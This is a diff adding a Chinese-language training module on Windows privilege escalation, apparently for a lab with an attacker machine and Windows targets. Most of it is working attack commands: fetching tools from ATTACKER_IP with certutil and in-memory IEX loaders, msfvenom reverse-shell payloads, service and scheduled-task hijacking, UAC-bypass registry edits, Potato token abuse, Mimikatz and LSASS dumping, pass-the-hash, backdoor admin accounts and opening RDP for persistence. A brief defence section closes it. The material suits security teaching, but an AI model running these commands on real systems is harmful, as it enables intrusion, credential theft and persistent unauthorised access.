@@ -1,0 +1,652 @@
+================================================================================
+模块: Windows权限提升技术
+学习目标: 掌握winPEAS、PowerUp等Windows提权工具，熟悉Token窃取、服务配置错误等主流提权向量
+目标工具: winPEAS, PowerUp, accesschk, Mimikatz, Metasploit (getsystem)
+所需环境: ArchStrike (攻击机), Windows靶机 (Windows 7/10/Server)
+================================================================================
+
+一、Windows提权概述
+--------------------------------------------------------------------------------
+
+Windows权限体系与Linux有本质区别:
+
+  ┌─────────────────────────────────────────────────────┐
+  │ 用户 (User)          → 普通用户权限                 │
+  │ 管理员 (Administrator)→ 本地最高权限                │
+  │ SYSTEM (NT AUTHORITY\SYSTEM) → 比Administrator更高  │
+  │ TrustedInstaller      → Windows更新服务级别         │
+  └─────────────────────────────────────────────────────┘
+
+Windows提权的典型路径:
+  普通用户 → 本地管理员 → SYSTEM (→ 域管理员)
+
+常见的低权限入口:
+  - Web应用漏洞获得的IIS APPPOOL\DefaultAppPool用户
+  - 钓鱼邮件附件执行的宏木马
+  - RDP弱密码登录的低权限用户
+  - 通过SMB漏洞获得的非管理员权限
+
+获得初始shell后第一件事:
+  whoami
+  whoami /priv
+  whoami /groups
+  net user %username%
+  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+
+二、winPEAS - Windows权限分析神器
+--------------------------------------------------------------------------------
+
+winPEAS是PEAS系列中Windows平台的版本，全称为"Privilege Escalation Awesome Script"。
+它是目前最全面的Windows权限枚举工具。
+
+2.1 获取winPEAS
+
+在ArchStrike攻击机上:
+
+  sudo pacman -S peass
+
+或从GitHub下载:
+
+  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
+  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe
+  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat
+
+选择适合的版本:
+  - winPEASx64.exe  → 64位Windows系统
+  - winPEASx86.exe  → 32位Windows系统
+  - winPEAS.bat     → 批处理版本（无需.exe, 兼容性最好但信息较少）
+
+2.2 上传winPEAS到目标
+
+方法一: HTTP服务器（推荐）
+
+  攻击机:
+    python3 -m http.server 8080
+
+  目标机 (PowerShell):
+    (New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8080/winPEASx64.exe', 'C:\Users\Public\wp.exe')
+
+  目标机 (cmd):
+    certutil -urlcache -f http://ATTACKER_IP:8080/winPEASx64.exe C:\Users\Public\wp.exe
+
+方法二: SMB服务器
+
+  攻击机:
+    impacket-smbserver share /path/to/tools/ -smb2support
+
+  目标机:
+    copy \\ATTACKER_IP\share\winPEASx64.exe C:\Users\Public\wp.exe
+
+方法三: Meterpreter上传
+
+  如果已经获得了Meterpreter会话:
+    upload /path/to/winPEASx64.exe C:\\Users\\Public\\wp.exe
+
+方法四: FTP服务器
+
+  攻击机:
+    python3 -m pyftpdlib -p 21
+
+  目标机:
+    echo open ATTACKER_IP>ftp.txt
+    echo anonymous>>ftp.txt
+    echo binary>>ftp.txt
+    echo get winPEASx64.exe C:\Users\Public\wp.exe>>ftp.txt
+    echo bye>>ftp.txt
+    ftp -s:ftp.txt
+
+2.3 运行winPEAS
+
+  运行并保存输出:
+    C:\Users\Public\wp.exe > output.txt 2>&1
+
+  只运行特定检查类别:
+    C:\Users\Public\wp.exe systeminfo > si_output.txt
+    C:\Users\Public\wp.exe userinfo > ui_output.txt
+
+  后台运行（避免长时间占用shell）:
+    start /b C:\Users\Public\wp.exe > output.txt 2>&1
+
+2.4 winPEAS输出解读
+
+winPEAS的输出使用颜色标记重要程度:
+  - [RED] 红色: 极高概率的提权向量
+  - [YELLOW] 黄色: 中等概率
+  - [GREEN] 绿色: 信息
+
+重点关注区域:
+
+  ╔══════════════════════════════════════════════════╗
+  ║ 1. Windows Credentials  存储的凭证              ║
+  ║ 2. Services Information 服务信息(重点)          ║
+  ║ 3. Applications         已安装的应用及版本      ║
+  ║ 4. Internet & Network   网络信息                ║
+  ║ 5. Users               用户和组信息             ║
+  ║ 6. Scheduled Tasks      计划任务                ║
+  ║ 7. System Information   系统信息                ║
+  ║ 8. Files Analysis       文件分析                ║
+  ║ 9. Credentials          浏览器/应用凭证         ║
+  ╚══════════════════════════════════════════════════╝
+
+特别关注的winPEAS发现:
+
+  1) 服务中的AutoRuns:
+     Looking for AutoRuns   ← 所有自启动项
+     检查是否有当前用户可写的服务路径
+
+  2) 未引用的服务路径:
+     Checking service paths with spaces and without quotes
+     重点: 路径有心空格+没有引号包裹
+
+  3) 可修改的服务:
+     Modifiable Services
+     检查: StartName是否为LocalSystem + 当前用户是否可以修改
+
+  4) AlwaysInstallElevated:
+     AlwaysInstallElevated
+     如果两个注册表键都为1，可以提权安装MSI
+
+  5) 存储的凭证:
+     Cached Credentials
+     包括: cmdkey列表、RDP凭证、浏览器保存的密码
+
+  6) 计划任务:
+     Scheduled Taks Analysis
+     检查: 任务是否以SYSTEM运行 + 脚本是否可写
+
+  7) 漏洞的已安装程序:
+     Search Exploits
+     自动匹配已安装程序中是否有已知漏洞版本
+
+  8) 注册表中的AutoRun键:
+     Autorun Applications
+     HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 等
+
+三、PowerUp - PowerSploit提权模块
+--------------------------------------------------------------------------------
+
+PowerUp是PowerSploit框架中的权限枚举和提权模块。
+
+3.1 获取PowerUp
+
+  # 在攻击机上
+  wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+
+  或者克隆整个PowerSploit:
+    git clone https://github.com/PowerShellMafia/PowerSploit.git
+
+3.2 加载PowerUp
+
+  方法一: 本地下载后加载
+    在目标Windows机器上:
+      PowerShell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/PowerUp.ps1'); Invoke-AllChecks"
+
+  方法二: 从内存加载(不落地)
+    IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/PowerUp.ps1')
+    # 加载后执行:
+    Invoke-AllChecks | Out-File -FilePath C:\Users\Public\powerup.txt
+
+  方法三: 本地dot-sourcing
+    下载PowerUp.ps1到本地后:
+      PowerShell -ExecutionPolicy Bypass
+      . .\PowerUp.ps1
+      Invoke-AllChecks | Export-Csv powerup_results.csv
+
+3.3 PowerUp主要功能
+
+  1) Invoke-AllChecks (运行所有检查):
+     综合检查所有已知的提权向量
+
+  2) Get-UnquotedService (查找未引用路径的服务):
+     Get-UnquotedService | Out-File unquoted.txt
+
+  3) Get-ModifiableService (查找可修改的服务):
+     Get-ModifiableService | Out-File modifiable.txt
+
+  4) Get-ServiceDetail (获取服务的详细配置):
+     Get-ServiceDetail -ServiceName Spooler
+
+  5) Invoke-ServiceAbuse (滥用可修改的服务):
+     Invoke-ServiceAbuse -ServiceName VulnService -Command "net user hacker Password123 /add"
+
+  6) Write-ServiceBinary (写入后门服务二进制):
+     Write-ServiceBinary -ServiceName VulnService -Path "C:\Program Files\Vuln\service.exe"
+
+  7) Write-UserAddMSI (AlwaysInstallElevated提权):
+     Write-UserAddMSI
+     # 生成一个MSI文件，安装后将添加后门用户
+
+  8) Invoke-AllChecks:
+     // 自动运行所有检查并输出详细报告
+
+四、Windows提权常用方法详解
+--------------------------------------------------------------------------------
+
+4.1 服务权限配置错误
+
+原理: 如果以SYSTEM身份运行的服务，其可执行文件或配置对当前用户可写，
+那么可以通过修改服务来执行任意代码，从而获得SYSTEM权限。
+
+Step 1: 发现目标服务
+  使用accesschk (Sysinternals):
+    accesschk.exe -uwcqv "USERS" * /accepteula
+    
+  或使用PowerShell:
+    Get-WmiObject win32_service | Where-Object {$_.StartName -eq "LocalSystem"} | Format-Table Name, PathName
+
+  使用winPEAS自动发现:
+    winPEAS → Services Information → Modifiable Services
+
+Step 2: 检查是否可以停止和启动服务
+  sc qc VulnService
+  sc stop VulnService
+  sc start VulnService
+
+Step 3: 修改服务配置
+  sc config VulnService binpath= "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"
+  sc start VulnService
+
+Step 4: 更隐蔽的方式（修改后还原）
+  # 记录原始路径
+  sc qc VulnService
+  # 修改路径为后门命令
+  sc config VulnService binpath= "C:\Windows\Temp\shell.exe"
+  # 启动后门服务
+  sc start VulnService
+  # 获取SYSTEM shell后，还原服务路径
+  sc config VulnService binpath= "C:\Original\Path\service.exe"
+
+4.2 未引用服务路径 (Unquoted Service Path)
+
+原理: 如果服务路径包含空格但没有用引号包裹，Windows会按顺序尝试执行
+路径中的每个部分。例如路径为 C:\Program Files\Vuln App\service.exe，
+Windows会尝试执行:
+  1. C:\Program.exe
+  2. C:\Program Files\Vuln.exe
+  3. C:\Program Files\Vuln App\service.exe （正确路径）
+
+如果我们在C:\Program Files\Vuln.exe位置写入后门文件，服务启动时会执行它。
+
+使用PowerUp发现:
+  Get-UnquotedService
+
+手动发现:
+  wmic service get name,pathname,startname | findstr /i "LocalSystem" | findstr /i /v "\""
+
+利用步骤:
+  Step 1: 确认发现的可写路径
+    icacls "C:\Program Files\Vuln App"  # 检查当前用户是否有写入权限
+
+  Step 2: 生成后门可执行文件
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Vuln.exe
+
+  Step 3: 上传后门到未引用路径
+    如果路径为 C:\Program Files\Vuln App\service.exe
+    则将后门放置为 C:\Program Files\Vuln.exe
+
+  Step 4: 停止并启动服务
+    sc stop VulnService
+    sc start VulnService
+
+4.3 AlwaysInstallElevated注册表提权
+
+原理: 如果两个注册表键被设置为1，Windows允许任何用户以SYSTEM权限
+安装MSI包。
+
+检查注册表:
+  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+如果两者都返回 0x1，则可利用。
+
+利用步骤:
+  Step 1: 使用msfvenom生成MSI后门
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi
+
+  Step 2: 上传到目标并安装
+    msiexec /quiet /qn /i C:\Users\Public\shell.msi
+
+  或使用PowerUp自动利用:
+    Write-UserAddMSI
+    # 然后在生成的MSI文件所在目录:
+    msiexec /i UserAdd.msi
+
+4.4 Token窃取 (Token Impersonation)
+
+原理: Windows的访问令牌决定了进程的权限。某些用户（通常Service账户如
+IIS APPPOOL）拥有SeImpersonatePrivilege权限，可以冒充其他用户的令牌。
+
+检查是否拥有SeImpersonatePrivilege:
+  whoami /priv
+
+如果看到:
+  SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
+  SeAssignPrimaryTokenPrivilege Replace a process level token                Enabled
+
+利用方法 (使用Meterpreter):
+
+  # 在Meterpreter中:
+  meterpreter> getuid
+  Server username: IIS APPPOOL\DefaultAppPool
+  meterpreter> load incognito
+  meterpreter> list_tokens -u
+  meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"
+  meterpreter> getuid
+  Server username: NT AUTHORITY\SYSTEM
+
+  或使用getsystem:
+    meterpreter> getsystem
+    meterpreter> getsystem -t 1  # 使用Named Pipe模拟令牌
+    meterpreter> getsystem -t 2  # 使用Token Duplication
+    meterpreter> getsystem -t 3  # 使用Service(创建新服务)
+
+利用方法 (使用工具):
+  1) JuicyPotato / RoguePotato / SweetPotato (土豆家族):
+     适用: 拥有SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege
+     
+     JuicyPotato使用:
+       JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user hacker Pass123 /add && net localgroup administrators hacker /add" -t *
+     
+     SweetPotato (新版):
+       SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Users\Public\result.txt"
+     
+     RoguePotato (Win10+/Server2019):
+       RoguePotato.exe -r ATTACKER_IP -e "C:\Windows\System32\cmd.exe /c whoami" -l 9999
+
+  2) PrintSpoofer / PipePotato:
+     适用: 拥有SeImpersonatePrivilege
+     PrintSpoofer.exe -c "cmd /c whoami"
+     PrintSpoofer.exe -i -c "cmd"
+
+  3) GodPotato (最新):
+     GodPotato.exe -cmd "C:\Windows\System32\cmd.exe /c whoami"
+
+Potato家族工具选择指南:
+  ┌─────────────────┬──────────────────────────────────┐
+  │ 工具              │ 适用场景                        │
+  ├─────────────────┼──────────────────────────────────┤
+  │ JuicyPotato     │ Win7/8/10 (CLSID依赖OS版本)     │
+  │ RoguePotato     │ Win10+/Server2019+               │
+  │ SweetPotato     │ 新版(集成了多种CLSID)            │
+  │ PrintSpoofer    │ Win10+/Server2019+               │
+  │ GodPotato       │ Win10+/Server2012+  (最通用)     │
+  └─────────────────┴──────────────────────────────────┘
+
+4.5 UAC绕过
+
+原理: UAC (User Account Control) 是Windows的安全机制，即使你是管理员
+组成员，执行管理操作时仍需要提升。UAC绕过允许跳过这个弹窗直接提升。
+
+检查UAC级别:
+  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+
+UAC级别:
+  0 - Never notify (从不通知)
+  1 - Always notify (总是通知) - 最高安全性
+  2 - Notify only when apps try to change (默认)
+  3 - Notify only (不调暗桌面)
+  5 - Default + Secure Desktop (最高安全)
+
+常用UAC绕过方法:
+
+  1) Fodhelper.exe绕过 (Win10):
+     注册表操作:
+       reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
+       reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe /c C:\Users\Public\shell.exe" /f
+       fodhelper.exe
+
+  2) Eventvwr.exe绕过:
+     注册表操作:
+       reg add HKCU\Software\Classes\mscfile\Shell\Open\command /ve /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
+       eventvwr.exe
+
+  3) ComputerDefaults.exe绕过:
+       reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe /c start cmd.exe" /f
+       reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
+       computerdefaults.exe
+
+  使用Metasploit的UAC绕过模块:
+    msf6> use exploit/windows/local/bypassuac
+    msf6> use exploit/windows/local/bypassuac_fodhelper
+    msf6> use exploit/windows/local/bypassuac_eventvwr
+
+  使用UACME工具:
+    Akagi64.exe 1   # 方法1
+    Akagi64.exe 23  # 方法23
+    Akagi64.exe 41  # 方法41
+
+  注意:
+    - UAC绕过需要你已经属于Administrators组
+    - 绕过UAC ≠ 提权，但如果已从普通用户提升到管理员但被UAC约束，
+      则使用UAC绕过可以执行需要提升权限的命令
+
+4.6 计划任务提权
+
+查找计划任务:
+  schtasks /query /fo LIST /v | findstr /i "TaskName"
+
+检查可写的计划任务脚本:
+  # winPEAS中:
+  Scheduled Tasks Analysis → 检查是否有SYSTEM任务运行的可写脚本
+
+  # 手动检查:
+  dir C:\Scripts\*.*    # 如果这个目录被计划任务引用且可写
+  
+利用可写脚本:
+  如果 C:\Scripts\cleanup.bat 由SYSTEM计划任务运行且当前用户可写:
+    echo net user hacker Password123 /add >> C:\Scripts\cleanup.bat
+    echo net localgroup administrators hacker /add >> C:\Scripts\cleanup.bat
+    # 等待计划任务下次运行，或手动触发:
+    schtasks /run /tn "CleanupTask"
+
+4.7 凭证提取 - Mimikatz
+
+原理: Windows在内存中存储凭证信息（明文或哈希），Mimikatz可以从
+LSASS进程内存中提取这些凭证。
+
+Mimikatz获取方式:
+  sudo pacman -S mimikatz
+
+  或从GitHub下载:
+    wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
+
+运行Mimikatz (需要管理员/SYSTEM权限):
+
+  # 需要在管理员Powershell或cmd中运行
+  mimikatz.exe
+  privilege::debug
+  token::elevate
+  sekurlsa::logonpasswords
+  lsadump::sam
+  lsadump::secrets
+  lsadump::cache
+
+如果权限不足，先提权到SYSTEM:
+  # Meterpreter中:
+  meterpreter> getsystem
+  meterpreter> load kiwi
+  meterpreter> creds_all
+
+使用procdump | dump LSASS进程:
+
+  # 1. Dump LSASS内存
+  procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+
+  # 2. 将lsass.dmp下载到攻击机
+
+  # 3. 在攻击机上用Mimikatz分析
+  mimikatz.exe
+  sekurlsa::minidump lsass.dmp
+  sekurlsa::logonpasswords
+
+Pass-the-Hash (PtH) - 无需解密密码，使用哈希直接认证:
+
+  # Mimikatz获取NTLM哈希后:
+  sekurlsa::pth /user:Administrator /domain:TARGET /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+  # 会弹出一个新的cmd窗口，已使用该凭证认证
+
+  # 或使用impacket:
+  impacket-psexec -hashes :NTLM_HASH Administrator@TARGET_IP
+
+  # 或使用CrackMapExec:
+  crackmapexec smb TARGET_IP -u Administrator -H NTLM_HASH
+
+4.8 其他Windows提权向量
+
+注册表AutoRun:
+  reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+  # 如果某AutoRun指向的文件可写，可以植入后门
+
+启动文件夹:
+  dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+  # 在当前用户可写的情况下写入快捷方式
+
+.DLL劫持:
+  某些程序加载DLL时优先搜索当前目录，在可写目录放置恶意DLL即可
+
+内核漏洞 (使用Watson或windows-exploit-suggester):
+  # 在攻击机上下载windows-exploit-suggester
+  wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
+  # 在目标机上获取systeminfo输出
+  systeminfo > systeminfo.txt
+  # 在攻击机上分析
+  python windows-exploit-suggester.py --database xxxx.xlsx --systeminfo systeminfo.txt
+
+五、完整实践 - Windows靶机提权
+--------------------------------------------------------------------------------
+
+环境: 攻击机(ArchStrike) + Windows 7/10靶机
+
+假设: 已通过某种方式获得了一个低权限用户的Meterpreter会话
+  meterpreter> getuid
+  Server username: WIN-TARGET\LowPrivUser
+
+Step 1: 初始信息收集
+
+  meterpreter> sysinfo
+  meterpreter> getuid
+  meterpreter> shell
+  whoami /priv
+  whoami /groups
+  systeminfo
+  net user %username%
+  net localgroup administrators
+
+Step 2: 上传winPEAS进行自动枚举
+
+  meterpreter> upload /path/to/winPEASx64.exe C:\\Users\\Public\\wp.exe
+  meterpreter> shell
+  C:\Users\Public\wp.exe > C:\Users\Public\peas_output.txt 2>&1
+
+Step 3: 下载PEAS结果到攻击机分析
+
+  meterpreter> download C:\\Users\\Public\\peas_output.txt
+
+  在攻击机上查看:
+    grep -i "red\|yellow\|interesting\|vulnerable\|exploit\|potato\|unquoted\|modifiable" peas_output.txt
+
+Step 4: 加载PowerUp进行检查
+
+  meterpreter> shell
+  PowerShell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/PowerUp.ps1'); Invoke-AllChecks | Out-File C:\Users\Public\powerup_result.txt"
+
+Step 5: 尝试Token窃取提权
+
+  meterpreter> getsystem
+  # 如果成功，直接获得SYSTEM
+  meterpreter> getuid
+  Server username: NT AUTHORITY\SYSTEM
+
+Step 6: 如果getsystem失败，尝试Potato系列
+
+  检查权限:
+    meterpreter> shell
+    whoami /priv | findstr "SeImpersonate"
+
+  上传SweetPotato:
+    meterpreter> upload /path/to/SweetPotato.exe C:\\Users\\Public\\sp.exe
+
+  生成反弹shell命令:
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe -o shell.exe
+
+  上传并执行:
+    meterpreter> upload /path/to/shell.exe C:\\Users\\Public\\shell.exe
+    meterpreter> shell
+    # 先设好第二个监听器
+    C:\Users\Public\sp.exe -p C:\Users\Public\shell.exe
+
+Step 7: 提取凭证
+
+  获得SYSTEM后:
+    meterpreter> load kiwi
+    meterpreter> creds_all
+    # 或
+    meterpreter> shell
+    whoami
+    C:\Users\Public\mimikatz.exe
+    privilege::debug
+    sekurlsa::logonpasswords
+
+Step 8: 维持访问
+
+  添加用户:
+    meterpreter> shell
+    net user redteam Password123! /add
+    net localgroup administrators redteam /add
+    net localgroup "Remote Desktop Users" redteam /add
+
+  启用RDP:
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+    netsh advfirewall firewall add rule name="RDP" dir=in protocol=tcp localport=3389 action=allow
+
+Step 9: 横向移动
+
+  如果目标是域成员:
+    meterpreter> getsystem
+    meterpreter> load kiwi
+    meterpreter> creds_all
+    # 使用获取的域凭证横向移动
+    
+  查找内部网络信息:
+    ipconfig /all
+    net view
+    net view /domain
+    nltest /dclist:DOMAIN
+
+六、Windows提权防御（蓝队视角）
+--------------------------------------------------------------------------------
+
+防御建议:
+
+  1. 服务路径配置
+     - 所有服务路径使用引号包裹
+     - 严格控制服务目录的写入权限
+
+  2. UAC保护
+     - 使用最高的UAC级别（Always notify）
+     - 管理员审批模式启用
+
+  3. 注册表安全
+     - 禁用AlwaysInstallElevated
+     - 审计注册表AutoRun键
+
+  4. 凭证保护
+     - 启用Credential Guard
+     - 启用LSA保护
+     - 使用Protected Users组
+
+  5. 审计和监控
+     - 监控服务创建/修改
+     - 监控SeImpersonatePrivilege的异常使用
+     - 启用Windows Defender ATP
+
+  6. 最小权限原则
+     - 服务账户使用最小权限
+     - 定期审计用户组成员资格
+
+================================================================================
+总结: Windows提权与Linux提权有相似的理念但不同的技术路线。winPEAS是
+信息收集的核心工具，几乎能覆盖所有常见配置类提权向量。Token窃取（Potato
+系列）是Windows特有的强大提权路径。学会从低权限到SYSTEM的完整链条，
+是每个红队队员必须掌握的核心技能。
+================================================================================
